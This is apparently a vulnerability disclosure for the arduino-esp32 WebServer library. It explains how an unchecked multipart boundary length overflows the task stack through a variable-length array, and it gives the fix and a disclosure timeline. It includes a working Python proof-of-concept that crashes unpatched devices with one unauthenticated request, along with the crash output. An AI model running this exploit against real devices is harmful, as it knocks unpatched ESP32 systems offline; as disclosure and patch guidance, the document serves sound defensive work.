description:
## Summary

  The `WebServer` multipart form parser in arduino-esp32 allocates a Variable Length Array (VLA) on the stack whose size is derived from an attacker-controlled HTTP header field (`Content-Type: multipart/form-data; boundary=...`) without enforcing any length limit. Sending a boundary string longer than ~8000 characters overflows the 8192-byte task stack of the `loopTask`, causing a crash and potential remote code execution.

  ## Affected component

  - Repository: `espressif/arduino-esp32`
  - File: `libraries/WebServer/src/Parsing.cpp`, lines 505–507
  - Versions: all releases up to and including **3.3.7**

  ## Root cause

  ```cpp
  // Parsing.cpp:505-507 — boundary comes from Content-Type header, no length check int fastBoundaryLen = 4 /* \r\n-- */ + boundary.length() + 1 /* \0 */;
  char fastBoundary[fastBoundaryLen];  // VLA allocated on task stack snprintf(fastBoundary, fastBoundaryLen, "\r\n--%s", boundary.c_str());

  The boundary is extracted at line 171 with no validation:
  boundaryStr = headerValue.substring(headerValue.indexOf('=') + 1);

  The ESP32 Arduino loopTask runs with an 8192-byte stack. A boundary string of ~8000+ characters causes fastBoundaryLen to exceed the remaining stack space, overflowing into heap memory below the stack and triggering a crash. RFC 2046 defines a maximum boundary length of 70 characters.

  Proof of Concept

  Victim firmware: Any Arduino-ESP32 sketch that registers an HTTP upload handler,
  e.g. server.on("/upload", HTTP_POST, handleUpload, handleFileUpload).

  Attacker script (exploit_webserver_vla.py):

  import socket, sys

  target = sys.argv[1]  # ESP32 IP
  boundary = "A" * 12000  # 12 KB → guaranteed stack overflow

  body  = f"--{boundary}\r\n"
  body += 'Content-Disposition: form-data; name="file"; filename="t.txt"\r\n'
  body += "Content-Type: text/plain\r\n\r\n"
  body += "test\r\n"
  body += f"--{boundary}--\r\n"

  req  = f"POST /upload HTTP/1.1\r\nHost: {target}\r\n"
  req += f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
  req += f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
  req += body

  s = socket.socket(); s.settimeout(10); s.connect((target, 80))
  s.send(req.encode())
  try:
      s.recv(4096)
  except (socket.timeout, ConnectionResetError):
      print("CRASHED")

  Result on ESP32-D0WD-V3 rev3.1 (arduino-esp32 v3.3.7):

  Attacker side:
  [*] Target: 192.168.4.1:80
  [*] Boundary length: 12000 chars
  [*] VLA allocation: 12005 bytes on 8192-byte stack
  [*] Sending...
  [!] Connection reset - device CRASHED!

  ESP32 serial output:
  Guru Meditation Error: Core  0 panic'ed (LoadProhibited). Exception was unhandled.
  Core  0 register dump:
  ...
  ***ERROR*** A stack overflow in task loopTask has been detected.
  Rebooting...

  Device rebooted immediately. Attack is reliably reproducible (100% crash rate on
  every attempt).

  Impact

  Any ESP32 device running an Arduino WebServer with a file upload handler is vulnerable. A single unauthenticated HTTP request over Wi-Fi crashes the device. Stack smashing may enable remote code execution depending on heap layout and attacker-controlled boundary content.

  Fix

  Fixed in PR #12486 (commit bb86048), released in arduino-esp32 v3.3.8 (2026-04-12). The fix enforces RFC 2046's 70-character maximum boundary length before the VLA is allocated:

  // Parsing.cpp — fix in bb86048
  if (boundary.length() > 70) {
      return _parseFormUploadAborted();
  }

  Timeline

  - 2026-03-27: Vulnerability reported to bugbounty@espressif.com with encrypted attachment
  - 2026-04-01: Fix merged in PR #12486
  - 2026-04-12: Fix released in arduino-esp32 v3.3.8
  - 2026-04-13: Espressif confirmed fix
  - 2026-04-22: Reporter submit GHAS
  ---
summary: Stack buffer overflow in WebServer multipart boundary parsing leads to remote crash potential RCE
